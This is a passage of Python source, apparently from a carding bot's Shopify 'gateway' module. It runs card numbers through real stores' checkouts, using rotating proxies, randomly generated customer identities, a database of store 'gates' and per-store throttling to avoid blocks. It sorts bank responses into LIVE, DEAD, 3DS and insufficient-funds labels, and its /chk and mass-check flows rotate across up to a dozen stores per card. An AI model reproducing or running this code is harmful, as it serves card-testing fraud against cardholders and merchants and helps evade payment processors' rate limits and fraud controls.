    if error_code or error_msg:
        return GatewayResult(
            status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
            message=f"Bank Response [{error_code or error_msg[:60]}]",
            raw_code="bank_response"
        )

    # No error info at all = DEAD
    return GatewayResult(
        status=CCStatus.DEAD, gateway="Shopify",
        message="Declined — No bank response",
        raw_code="declined"
    )


def _parse_submit_error(code: str, msg: str) -> GatewayResult:
    """Parse submit error codes."""
    c = (code + " " + msg).upper()
    if any(x in c for x in ["INCORRECT_CVC", "INCORRECT_PIN", "CVC_WRONG"]):
        return GatewayResult(status=CCStatus.LIVE_VBV, gateway="Shopify",
                             message=f"Incorrect CVC [{code or msg[:40]}]", is_vbv=True, raw_code="incorrect_cvc")
    if "EXPIRED" in c:
        return GatewayResult(status=CCStatus.LIVE_VBV, gateway="Shopify",
                             message=f"Expired Card [{code or msg[:40]}]", is_vbv=True, raw_code="expired_card")
    if "INSUFFICIENT" in c:
        return GatewayResult(status=CCStatus.INSUFFICIENT, gateway="Shopify",
                             message="Insufficient Funds", raw_code="insufficient")
    if "3D" in c or "REDIRECT" in c or "AUTHENTICATION" in c:
        return GatewayResult(status=CCStatus.LIVE_VBV, gateway="Shopify",
                             message="3DS Required", is_vbv=True, raw_code="3ds")
    # Specific bank responses = LIVE
    if any(x in c for x in ["DO_NOT_HONOR", "RESTRICTED", "FRAUD", "BLOCKED", "INVALID_CARD", "STOLEN", "LOST"]):
        display_code = code or msg[:40] or "Bank Decline"
        return GatewayResult(status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
                             message=f"Bank Declined [{display_code}]", raw_code="do_not_honor")
    # GENERIC_ERROR = ambiguous (proxy fraud flag / AVS mismatch) — bank DID respond
    if "GENERIC_ERROR" in c:
        return GatewayResult(status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
                             message="Bank Declined [GENERIC_ERROR]", raw_code="do_not_honor")
    # Hard decline = DEAD
    if any(x in c for x in ["CARD_DECLINED", "DECLINED", "INVALID_AMOUNT", "INVALID_NUMBER"]):
        display_code = code or msg[:40] or "Declined"
        return GatewayResult(status=CCStatus.DEAD, gateway="Shopify",
                             message=f"Declined — {display_code}", raw_code="declined")
    # Has any code = bank responded = LIVE
    if code or msg:
        return GatewayResult(status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
                             message=f"Bank Response [{code or msg[:40]}]", raw_code="bank_response")
    return GatewayResult(status=CCStatus.DEAD, gateway="Shopify",
                         message="Submit Failed — Declined", raw_code="submit_failed")


# ── Store cache (module-level) ───────────────────────────────────────────────
# Cached store list — reloaded from DB at most once every 60 seconds.
# This prevents HAMMERING the DB with N queries per mass-check card.
_stores_cache: list[dict] = []
_stores_cache_ts: float = 0.0
_STORES_CACHE_TTL = 120.0  # seconds — longer TTL = fewer DB hits
_stores_cache_lock: asyncio.Lock | None = None  # lazy-init

# Track consecutive infra failures per store URL
# Only HARD infra errors (no session token, cart error, checkout exception)
# count toward cooldown — NOT no_delivery or no_payment (those are card/product level)
_store_fail_counts: dict[str, int] = {}  # base_url -> consecutive fail count
_store_cooldown_until: dict[str, float] = {}  # base_url -> time.monotonic() cooldown end
_CONSECUTIVE_FAIL_LIMIT = 50    # 50 consecutive infra fails before cooldown
_STORE_COOLDOWN_SECONDS = 2700  # 45 minutes cooldown before re-enabling

# Track consecutive no_delivery or no_payment (product configuration/address block)
_store_no_delivery_counts: dict[str, int] = {}
_store_no_delivery_cooldown: dict[str, float] = {}
_NO_DELIVERY_LIMIT = 15
_NO_DELIVERY_COOLDOWN_SECS = 1800  # 30 minutes cooldown

# Per-store request throttling to prevent Shopify 503 rate-limiting
_store_last_request_time: dict[str, float] = {}
_STORE_MIN_INTERVAL = 0.15  # 150ms minimum between requests to same store (was 400ms)


async def _track_infra_fail(store: dict, error_code: str):
    """Track consecutive infra failures.
    Only REAL infra errors count (no session token, cart fail, checkout fail).
    no_payment and no_delivery are card/product-level — they do NOT disable stores in DB.
    After CONSECUTIVE_FAIL_LIMIT, store gets a 30-min cooldown.
    """
    if error_code not in ("no_session_token", "checkout_exception", "no_checkout_id",
                          "cart_exception", "cart_error", "product_422", "vault_error", 
                          "vault_exception", "submit_exception", "poll_timeout", "throttled"):
        return
    url = store.get("base_url", "")
    _store_fail_counts[url] = _store_fail_counts.get(url, 0) + 1
    count = _store_fail_counts[url]
    logger.debug(f"Store {url} consecutive infra fail #{count} ({error_code})")

    # ── Auto-debug trigger (background, non-blocking) ─────────────────────────
    # Fires when store hits AUTO_DEBUG_THRESHOLD — checks reachability + product + payment
    try:
        from gateways.store_debugger import maybe_auto_debug
        asyncio.ensure_future(maybe_auto_debug(store, error_code))
    except Exception:
        pass

    if count >= _CONSECUTIVE_FAIL_LIMIT:
        import time as _time
        _store_cooldown_until[url] = _time.monotonic() + _STORE_COOLDOWN_SECONDS
        invalidate_stores_cache()
        logger.info(f"Store {url} cooldown 30min — {count} consecutive '{error_code}' failures")
        _store_fail_counts.pop(url, None)  # reset counter after cooldown


async def _track_no_delivery_fail(store: dict, error_code: str):
    """Track consecutive product/shipping config failures.
    Puts the store on a shorter 15-minute cooldown so we don't waste cards on it.
    """
    url = store.get("base_url", "")
    _store_no_delivery_counts[url] = _store_no_delivery_counts.get(url, 0) + 1
    count = _store_no_delivery_counts[url]
    logger.debug(f"Store {url} consecutive product/shipping fail #{count} ({error_code})")

    # ── Auto-debug trigger for product/delivery issues ────────────────────────
    try:
        from gateways.store_debugger import maybe_auto_debug
        asyncio.ensure_future(maybe_auto_debug(store, error_code))
    except Exception:
        pass

    if count >= _NO_DELIVERY_LIMIT:
        import time as _time
        _store_no_delivery_cooldown[url] = _time.monotonic() + _NO_DELIVERY_COOLDOWN_SECS
        invalidate_stores_cache()
        logger.info(f"Store {url} product/shipping cooldown 15min — {count} consecutive '{error_code}' failures")
        _store_no_delivery_counts.pop(url, None)


def _is_store_in_cooldown(url: str) -> bool:
    """Check if a store is currently in infra cooldown."""
    import time as _time
    cd = _store_cooldown_until.get(url, 0.0)
    if cd and _time.monotonic() < cd:
        return True
    if cd and _time.monotonic() >= cd:
        _store_cooldown_until.pop(url, None)  # cooldown expired, auto-recover
    return False


def _is_store_in_no_delivery_cooldown(url: str) -> bool:
    """Check if a store is currently in product/shipping rate cooldown."""
    import time as _time
    cd = _store_no_delivery_cooldown.get(url, 0.0)
    if cd and _time.monotonic() < cd:
        return True
    if cd and _time.monotonic() >= cd:
        _store_no_delivery_cooldown.pop(url, None)  # cooldown expired, auto-recover
    return False


def _reset_store_fail_count(url: str):
    """Reset fail counters when store succeeds."""
    _store_fail_counts.pop(url, None)
    _store_no_delivery_counts.pop(url, None)


def _get_cache_lock() -> asyncio.Lock:
    """Get or create the cache lock."""
    global _stores_cache_lock
    if _stores_cache_lock is None:
        _stores_cache_lock = asyncio.Lock()
    return _stores_cache_lock


async def _get_stores(force_reload: bool = False) -> list[dict]:
    global _stores_cache, _stores_cache_ts
    import time as _time
    if force_reload:
        _stores_cache = []
        _stores_cache_ts = 0.0
    now = _time.monotonic()
    if _stores_cache and (now - _stores_cache_ts) < _STORES_CACHE_TTL:
        return list(_stores_cache)
    async with _get_cache_lock():
        now = _time.monotonic()
        if _stores_cache and (now - _stores_cache_ts) < _STORES_CACHE_TTL:
            return list(_stores_cache)
        try:
            import database.db as db
            import json as _json
            gates = await db.get_active_shopify_gates(limit=300)
            if gates:
                stores = []
                for g in gates:
                    sd = g.get("scan_data", {})
                    if isinstance(sd, str):
                        try: sd = _json.loads(sd)
                        except: sd = {}
                    succ = g.get("success_count", 0)
                    fail = g.get("fail_count", 0)
                    total = succ + fail
                    success_rate = (succ / total) if total > 0 else 0.5
                    
                    stores.append({
                        "base_url":          g["base_url"],
                        "variant_id":        g["variant_id"],
                        "price":             g["price"],
                        "currency":          g.get("currency", "USD"),
                        "gate_id":           g["id"],
                        "delivery_handle":   sd.get("delivery_handle", ""),
                        "payment_method_id": sd.get("payment_method_id", "dc2c83c064fc75ebc5dfa2b5bee4f873"),
                        "storefront_token":  sd.get("storefront_token", ""),
                        "success_rate":      success_rate,
                    })
                logger.info(f"[Cache MISS] Loaded {len(stores)} active Shopify gates from DB")

                # Sort by success_rate descending — healthy stores tried first
                stores.sort(key=lambda s: s.get("success_rate", 0.5), reverse=True)
                
                # Filter out stores in cooldown (either infra or product/delivery cooldown)
                active_stores = [
                    s for s in stores 
                    if not _is_store_in_cooldown(s["base_url"]) 
                    and not _is_store_in_no_delivery_cooldown(s["base_url"])
                ]
                if len(active_stores) < len(stores):
                    logger.info(f"Filtered {len(stores) - len(active_stores)} stores in cooldown. {len(active_stores)} available.")
                _stores_cache = active_stores
                _stores_cache_ts = now
                return list(_stores_cache)
            else:
                logger.info("No active Shopify gates found in DB. Falling back to DEFAULT_STORES.")
        except Exception as e:
            logger.error(f"DB load error in shopify_gate: {e}", exc_info=True)
        logger.info(f"Using DEFAULT_STORES: {[s['base_url'] for s in DEFAULT_STORES]}")
        _stores_cache = list(DEFAULT_STORES)
        _stores_cache_ts = now
        return list(_stores_cache)


def invalidate_stores_cache():
    """Force-refresh store cache on next call (e.g., after /gscan adds new stores)."""
    global _stores_cache_ts
    _stores_cache_ts = 0.0


# Infra-level error codes (store/network broken, not card-level issue)
# Cards hitting these codes get RE-QUEUED on a DIFFERENT store — not counted as error
INFRA_ERROR_CODES = {
    "cart_error", "cart_exception", "checkout_exception",
    "vault_error", "vault_exception",
    "no_session_token", "no_checkout_id",
    "submit_exception", "poll_timeout",
    "throttled", "store_unavailable", "product_422",
    "gql_error",      # GQL HTTP-level error → infra, not card issue
    "no_receipt",     # SubmitSuccess but no receipt_id → transient
    "product_skip",   # PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE → IP blocked by store
}

# Product/store-config level errors (shorter cooldown, card re-queued on diff store)
# These track store-level config issues, not hard infra failures
PRODUCT_ERROR_CODES = {
    "no_delivery", "no_payment",
    "currency_skip",   # BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED → store doesn't support USD
    "phone_mismatch",  # DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH → phone format issue (retried first)
}

# Permanent per-session skip codes — store is skipped for ALL remaining cards in this session
# (not just the current card). No further retries on this store.
PERMANENT_SKIP_CODES = {
    "currency_skip",  # Store doesn't accept USD — useless for all cards
}


async def check_shopify_on_store(card: CardData, store: dict, segment: int = -1) -> GatewayResult:
    """
    Check a single card on a single specific Shopify store.
    Used by mass check store-pool architecture.
    Returns GatewayResult.
    """
    from core.proxy_manager import get_next_proxy, get_next_proxy_segment, get_connector, _build_proxy_url

    # Rotates proxies cleanly based on the specified segment index
    if segment >= 0:
        proxy = get_next_proxy_segment(segment)
    else:
        proxy = get_next_proxy()

    proxy_url = None
    if proxy:
        proxy_url = _build_proxy_url(proxy)
        connector = get_connector(proxy)
    else:
        connector = aiohttp.TCPConnector(ssl=False, limit=5, force_close=True)

    jar      = CookieJar(unsafe=True)
    customer = _generate_random_customer()

    try:
        # Per-store request throttling delay to avoid Shopify 503 blocks
        base_url = store.get("base_url", "")
        now = time.monotonic()
        last = _store_last_request_time.get(base_url, 0.0)
        wait = _STORE_MIN_INTERVAL - (now - last)
        if wait > 0:
            await asyncio.sleep(wait)
        _store_last_request_time[base_url] = time.monotonic()

        async with aiohttp.ClientSession(
            connector=connector, cookie_jar=jar, timeout=TIMEOUT,
        ) as session:
            result = await _try_shopify_payments(session, card, store, customer, proxy=proxy_url)

        # Attach store metadata to result
        try:
            result.charge_amount = float(store.get("price", "0.0"))
            result.extra["store_url"] = store.get("base_url", "")
            result.extra["currency"]  = store.get("currency", "USD")
        except Exception:
            pass

        # Update stats
        all_skip_codes = INFRA_ERROR_CODES | PRODUCT_ERROR_CODES
        if result.status == CCStatus.ERROR and result.raw_code in all_skip_codes:
            if result.raw_code in INFRA_ERROR_CODES:
                await _track_infra_fail(store, result.raw_code)
            elif result.raw_code in PRODUCT_ERROR_CODES:
                await _track_no_delivery_fail(store, result.raw_code)
        else:
            # Card-level result (decline, vbv, charged etc.) - resets fail count, updates gate success statistics
            _reset_store_fail_count(base_url)
            gate_id = store.get("gate_id") or store.get("id")
            if gate_id:
                try:
                    import database.db as _db
                    success = result.status != CCStatus.ERROR
                    await _db.update_shopify_gate_stats(gate_id, success)
                except Exception:
                    pass

        return result

    except asyncio.CancelledError:
        raise
    except asyncio.TimeoutError:
        return _err("Timeout", "cart_exception")
    except Exception as e:
        return _err(f"Exception: {str(e)[:60]}", "cart_exception")






# ── Public entry point (/chk — single card check) ────────────────────────────
# Architecture: Try ONE store at a time (sequential).
# If proxy/store gives infra error → rotate to next store + fresh proxy.
# Max _CHK_MAX_STORE_ATTEMPTS before giving up.
# NEVER runs multiple stores simultaneously — no server load spikes.

_CHK_MAX_STORE_ATTEMPTS = 12  # max stores to try before giving up (raised for /chk reliability)

async def check_shopify(card: CardData) -> GatewayResult:
    """Check CC via Shopify Payments — sequential store fallback.

    /chk flow:
      1. Pick store (round-robin random from healthy pool)
      2. Try with fresh proxy
      3. Infra error (no_session_token, cart_error, etc.)? → next store
      4. Card-level result (charged/declined/3ds)? → return immediately
      5. After _CHK_MAX_STORE_ATTEMPTS → return error
    """
    import os
    from core.proxy_manager import get_next_proxy, get_connector, _build_proxy_url

    stores = await _get_stores()
    if not stores:
        stores = list(DEFAULT_STORES)

    # Shuffle for natural rotation diversity (avoid hammering same store every time)
    random.shuffle(stores)

    # Build a combined list: DB stores first, then DEFAULT_STORES as ultimate fallback
    db_urls = {s.get("base_url", "") for s in stores}
    extra_fallbacks = [s for s in DEFAULT_STORES if s.get("base_url", "") not in db_urls]
    all_candidates = stores + extra_fallbacks

    _no_proxy = os.getenv("SHOPIFY_NO_PROXY", "false").lower() in ("true", "1", "yes")

    # Codes that mean the STORE/PROXY failed — not the card.
    # Retry with next store + fresh proxy.
    STORE_RETRY_CODES = {
        "cart_error", "cart_exception", "checkout_exception",
        "vault_error", "vault_exception",
        "no_session_token", "no_checkout_id",
        "submit_exception", "poll_timeout",
        "throttled", "store_unavailable",
        "gql_error",    # GQL HTTP error — infra issue, not card
        "no_receipt",   # SubmitSuccess but no receipt_id — transient
    }
    # Codes that mean THIS STORE just doesn't serve this area/product.
    # Count separately — still move to next store, but don't penalise infra fail count.
    PRODUCT_SKIP_CODES = {"no_delivery", "no_payment", "product_422"}

    for attempt, store in enumerate(all_candidates[:_CHK_MAX_STORE_ATTEMPTS]):
        customer   = _generate_random_customer()
        store_url  = store.get("base_url", "")

        # Fresh proxy per attempt
        store_proxy = None if _no_proxy else get_next_proxy()
        store_proxy_url = None
        if store_proxy:
            store_proxy_url = _build_proxy_url(store_proxy)
            connector = get_connector(store_proxy)
        else:
            connector = aiohttp.TCPConnector(ssl=False, limit=5)

        jar = CookieJar(unsafe=True)
        try:
            async with aiohttp.ClientSession(
                connector=connector, cookie_jar=jar, timeout=TIMEOUT,
            ) as session:
                result = await _try_shopify_payments(session, card, store, customer,
                                                     proxy=store_proxy_url)
        except asyncio.CancelledError:
            raise
        except asyncio.TimeoutError:
            logger.debug(f"[/chk attempt {attempt+1}] {store_url} — timeout, trying next")
            await _track_infra_fail(store, "cart_exception")
            continue
        except Exception as e:
            logger.debug(f"[/chk attempt {attempt+1}] {store_url} — exception: {e}")
            await _track_infra_fail(store, "cart_exception")
            continue

        # Attach store metadata
        try:
            result.charge_amount    = float(store.get("price", "0.0"))
            result.extra["store_url"] = store_url
            result.extra["currency"]  = store.get("currency", "USD")
        except Exception:
            pass

        raw = result.raw_code

        if result.status == CCStatus.ERROR and raw in STORE_RETRY_CODES:
            # Real infra failure — penalise store, rotate
            logger.debug(f"[/chk attempt {attempt+1}] {store_url} — infra fail ({raw}), rotating")
            await _track_infra_fail(store, raw)
            continue

        if result.status == CCStatus.ERROR and raw in PRODUCT_SKIP_CODES:
            # Product/delivery config issue — rotate silently (don't penalise store)
            logger.debug(f"[/chk attempt {attempt+1}] {store_url} — product skip ({raw}), rotating")
            await _track_no_delivery_fail(store, raw)
            continue

        # ── Got a card-level result ─────────────────────────────────────────────
        _reset_store_fail_count(store_url)
        gate_id = store.get("gate_id")
        if gate_id:
            try:
                import database.db as _db
                success = result.status != CCStatus.ERROR
                await _db.update_shopify_gate_stats(gate_id, success)
            except Exception:
                pass

        logger.debug(f"[/chk attempt {attempt+1}] {store_url} — result: {result.status.value} ({raw})")
        return result

    return _err(
        "All Shopify gates unavailable. Run /gscan to add working gates.",
        "all_stores_failed"
    )


